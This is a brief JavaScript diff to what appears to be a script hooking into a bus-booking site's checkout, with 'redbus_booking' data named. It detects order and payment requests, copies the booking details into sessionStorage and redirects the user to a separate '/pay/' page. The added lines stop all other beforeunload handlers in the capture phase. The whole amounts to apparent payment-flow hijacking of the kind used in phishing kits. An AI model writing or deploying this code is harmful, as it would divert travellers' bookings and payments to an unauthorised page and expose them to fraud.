@@ -11,18 +11,14 @@
       || p.indexOf('/placeOrder') !== -1 || p.indexOf('/saveBooking') !== -1
       || p.indexOf('/proceedToPayment') !== -1 || p.indexOf('/paymentInit') !== -1;
   }
+  // Block all beforeunload handlers at capture phase
+  window.addEventListener('beforeunload', function(e) { e.stopImmediatePropagation(); }, true);
+
   function redirectPay() {
     var data = extractBookingData();
     if (data) {
       try { sessionStorage.setItem('redbus_booking', JSON.stringify(data)); } catch(ex) {}
-      fetch('/pay/').then(function(r) { return r.text(); }).then(function(html) {
-        document.open();
-        document.write(html);
-        document.close();
-      }).catch(function() {
-        window.onbeforeunload = null;
-        location.replace('/pay/');
-      });
+      location.href = '/pay/';
     }
   }
 
